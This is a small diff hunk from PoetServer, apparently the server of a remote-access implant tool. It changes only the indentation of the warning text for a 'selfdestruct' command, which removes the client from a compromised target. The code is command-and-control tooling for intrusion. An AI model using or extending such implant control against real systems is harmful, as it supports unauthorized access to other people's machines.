@@ -166,7 +166,7 @@ class PoetServer(object):
                 elif base == cmds[6]:
                     if inp == 'selfdestruct':
                         print """[!] WARNING: You are about to permanently remove the client from the target.
-        You will immediately lose access to the target. Continue? (y/n)""",
+    You will immediately lose access to the target. Continue? (y/n)""",
                         if raw_input().lower()[0] == 'y':
                             resp = self.conn.exchange('selfdestruct')
                             if resp == 'boom':
